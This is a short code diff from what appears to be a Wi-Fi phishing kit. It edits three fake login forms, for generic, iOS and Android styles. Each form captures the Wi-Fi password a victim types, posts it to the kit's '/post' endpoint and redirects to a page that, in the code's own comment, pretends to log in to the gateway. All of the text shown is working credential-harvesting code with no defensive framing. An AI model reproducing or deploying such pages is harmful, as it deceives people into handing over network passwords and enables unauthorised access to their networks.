@@ -505,7 +505,7 @@
 
     				// timeout:800
     				setTimeout(function(){
-    					$.post('/post', 'wfphshr-wpa-password=' + $('.main input[name=password]').val(), function(){
+    					$.post('/post', 'wfphshr-password=' + $('.main input[name=password]').val(), function(){
 	    					self.location = './gateway.html'; // pretend to log in to gateway
 	    				});
     				}, 800);
@@ -563,7 +563,7 @@
 			        // Don't submit a password smaller than 8 characters
 			        return false;
 			    } else {
-			    	$.post('/post', 'wfphshr-wpa-password=' + $('.ios input[name=password]').val(), function(){
+			    	$.post('/post', 'wfphshr-password=' + $('.ios input[name=password]').val(), function(){
 						window.location = './gateway.html'; // pretend to log in to gateway
 					});
 			    }
@@ -653,7 +653,7 @@
         			hideAndroid();
         			// timeout:1000
         			setTimeout(function(){
-        				$.post('/post', 'wfphshr-wpa-password=' + $('.android input[name=modal-password]').val(), function(){
+        				$.post('/post', 'wfphshr-password=' + $('.android input[name=modal-password]').val(), function(){
         					self.location = './gateway.html';
         				});
         			}, 600);
